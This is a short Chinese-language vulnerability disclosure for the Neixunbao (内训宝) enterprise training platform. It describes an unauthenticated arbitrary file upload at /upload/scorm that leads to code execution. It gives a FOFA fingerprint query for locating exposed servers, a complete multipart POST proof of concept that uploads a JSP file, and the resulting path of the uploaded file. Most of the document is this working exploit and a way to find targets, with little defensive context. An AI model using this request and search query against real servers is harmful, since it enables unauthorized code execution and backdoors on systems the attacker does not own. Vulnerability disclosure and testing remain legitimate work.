# 内训宝scorm存在任意文件上传漏洞
​	北京内训宝科技有限公司是一家国内知名的在线教育基础服务提供商，专注于在线教育基础服务，并开发符合互联网发展潮流的在线教育产品。内寻宝为北京内训宝科技有限公司专门用于培训行业所开发的一款基于java的服务平台。

​	内训宝企业培训平台 upload/scorm 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```javascript
body="static/nxb/css"
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1735633027515-abcf8dc0-00f2-4a7e-8010-201e8988c38f.png)

## poc
```rust
POST /upload/scorm HTTP/1.1
Host: 
Referer:
Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk

------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="fileupload"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print(111 * 111);%>
------w80tipyzy4xm9y5cb2zk--
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1735632988296-f27321f3-ff02-4bcd-a588-b842f65bdb95.png)

```rust
/upload/imgdefault/common/20241231/1735632951571259198.jsp
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1735633008849-1dfcdf5e-404c-44f4-a970-5496683deb8c.png)

